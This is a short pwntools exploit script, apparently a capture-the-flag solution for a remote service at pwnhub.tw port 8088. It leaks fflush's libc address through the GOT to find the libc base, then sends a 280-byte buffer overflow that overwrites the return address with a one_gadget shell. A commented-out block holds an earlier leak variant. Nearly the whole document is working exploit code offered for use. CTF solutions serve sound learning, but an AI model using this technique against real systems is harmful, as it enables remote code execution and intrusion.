#!/usr/bin/env python2

from pwn import *
from IPython import embed

context.arch = 'amd64'

e = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r = remote('pwnhub.tw', 8088)
#r = remote('127.0.0.1', 7122)

def leak(addr):
	r.recvrepeat(0.2)
	r.sendline(hex(addr))
	r.recvuntil(': ')
	x = r.recvline()
	return int(x, 16)

main_addr = 0x4006f6 
fflush_got = 0x601048
libc_fflush = leak(fflush_got)
print 'fflush:', hex(libc_fflush)

fflush_off = e.symbols['fflush']
libc_base = libc_fflush-fflush_off
one_gadget = 0xf0567
r.sendline('A'*280+p64(libc_base+one_gadget))
'''
r.sendline('A'*280+p64(main_addr))

printf_got = 0x601030
libc_printf = leak(printf_got)
print '__libc_start_main:', hex(libc_printf)
print '__libc_start_main offset:', hex(e.symbols['__libc_start_main'])
print 'libc_base:' , hex(libc_base)
'''

r.interactive()

